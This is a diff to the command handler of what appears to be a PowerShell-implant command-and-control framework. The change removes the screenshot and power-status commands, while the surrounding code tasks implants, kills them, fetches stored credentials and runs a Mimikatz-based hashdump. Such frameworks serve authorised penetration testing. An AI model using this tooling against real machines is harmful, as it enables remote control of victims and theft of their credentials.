@@ -2,8 +2,7 @@ import base64, re, traceback, os, sys
 from Alias import ps_alias
 from Colours import Colours
 from Utils import validate_sleep_time
-from DB import new_task, update_sleep, get_history, select_item, update_label, unhide_implant, kill_implant, get_implantdetails, get_c2server_all
-from DB import get_newimplanturl, get_allurls, get_sharpurls, get_cred_by_id, new_c2_message, get_powerstatusbyrandomuri
+from DB import new_task, update_sleep, get_history, select_item, update_label, unhide_implant, kill_implant, get_implantdetails, get_c2server_all, get_newimplanturl, get_allurls, get_sharpurls, get_cred_by_id, new_c2_message
 from AutoLoads import check_module_loaded, run_autoloads
 from Help import posh_help, posh_help1, posh_help2, posh_help3, posh_help4, posh_help5, posh_help6, posh_help7, posh_help8
 from Config import PayloadsDirectory, POSHDIR, ROOTDIR, SocksHost
@@ -16,7 +15,6 @@ from prompt_toolkit.history import FileHistory
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
 from prompt_toolkit.styles import Style
 from CommandPromptCompleter import FilePathCompleter
-from PowerStatus import getpowerstatus
 
 
 def handle_ps_command(command, user, randomuri, startup, createdaisypayload, createproxypayload, implant_id, commandloop):
@@ -659,25 +657,6 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
 
     elif command == "ps":
         new_task("get-processlist", user, randomuri)
-
-    elif (command.startswith("get-screenshotmulti")):
-        pwrStatus = get_powerstatusbyrandomuri(randomuri)
-        if (pwrStatus is not None and pwrStatus["ScreenLocked"]):
-            ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (Y/n) ")
-            if ri.lower() == "n":
-                return
-        new_task(command, user, randomuri)
-
-    elif (command == "get-powerstatus"):
-        getpowerstatus(randomuri)
-
-    elif (command.startswith("get-screenshot")):
-        pwrStatus = get_powerstatusbyrandomuri(randomuri)
-        if (pwrStatus is not None and pwrStatus["ScreenLocked"]):
-            ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (Y/n) ")
-            if ri.lower() == "n":
-                return
-        new_task(command, user, randomuri)
 
     elif command == "hashdump":
         check_module_loaded("Invoke-Mimikatz.ps1", randomuri, user)
